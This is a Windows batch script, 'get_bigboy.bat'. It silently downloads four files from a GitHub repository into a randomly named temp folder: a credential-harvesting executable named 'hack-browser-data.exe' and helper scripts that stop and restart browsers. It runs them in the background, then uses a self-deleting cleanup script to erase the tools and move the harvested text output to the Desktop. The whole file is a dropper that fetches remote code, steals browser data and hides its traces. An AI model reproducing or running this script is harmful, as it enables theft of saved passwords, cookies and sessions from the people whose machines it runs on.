REM =====================
REM get_bigboy.bat
REM =====================
@echo off
setlocal EnableDelayedExpansion

REM Create temp directory with random name to avoid conflicts
set "tempdir=%TEMP%\bb_%RANDOM%"
mkdir "%tempdir%" 2>nul
cd "%tempdir%"

echo Downloading files...
curl -L -s -o process.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/process.bat
curl -L -s -o stop_browsers.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/stop_browsers.bat
curl -L -s -o start_browsers.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/start_browsers.bat
curl -L -s -o hack-browser-data.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/hack-browser-data.exe

REM Verify downloads
if not exist "process.bat" (
    echo Failed to download process.bat
    exit /b 1
)
if not exist "hack-browser-data.exe" (
    echo Failed to download hack-browser-data.exe
    exit /b 1
)

REM Create the cleanup script
echo @echo off > cleanup.bat
echo setlocal EnableDelayedExpansion >> cleanup.bat
echo set "processdir=%tempdir%" >> cleanup.bat
echo :WAIT >> cleanup.bat
echo timeout /t 1 /nobreak ^> nul >> cleanup.bat
echo if exist "%%processdir%%\running.tmp" goto WAIT >> cleanup.bat
echo del /F /Q "%tempdir%\process.bat" 2^>nul >> cleanup.bat
echo del /F /Q "%tempdir%\stop_browsers.bat" 2^>nul >> cleanup.bat
echo del /F /Q "%tempdir%\start_browsers.bat" 2^>nul >> cleanup.bat
echo del /F /Q "%tempdir%\hack-browser-data.exe" 2^>nul >> cleanup.bat
echo move /Y "%tempdir%\*.txt" "%USERPROFILE%\Desktop\" 2^>nul >> cleanup.bat
echo rmdir /S /Q "%tempdir%" 2^>nul >> cleanup.bat
echo del /F /Q "%%~f0" >> cleanup.bat

REM Create running flag
echo 1 > "%tempdir%\running.tmp"

REM Start the process and cleanup in background
start /B cmd /c "%tempdir%\process.bat"
start /B cmd /c "%tempdir%\cleanup.bat"

exit
